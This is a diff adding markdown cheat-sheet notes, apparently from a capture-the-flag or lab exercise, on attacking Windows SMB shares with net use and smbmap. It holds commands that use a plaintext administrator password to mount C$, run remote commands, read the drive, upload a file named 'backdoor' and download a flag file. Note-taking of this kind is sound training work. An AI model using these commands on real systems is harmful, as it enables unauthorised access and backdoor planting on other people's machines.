@@ -1,0 +1,11 @@
+- __```net use z: \\10.5.19.82\c$ smbserver_771 /user:administrator```__
+- ##### SMBMap
+- `smbmap -u guest -p "" -d . -H 10.0.1.22`
+- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22`
+- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -x "ipconfig"`
+- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -L`
+- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -r 'C$'` ---> reads the content of the 'C' drive
+- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --upload '/root/backdoor' 'C$\backdoor'`
+  - `--upload '/root/backdoor'`---> upload the backdoor file 
+  - `'C$\backdoor'`  ---> giving the path to where to upload the backdoor file in target system 
+- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --download "C$\flag.txt"`
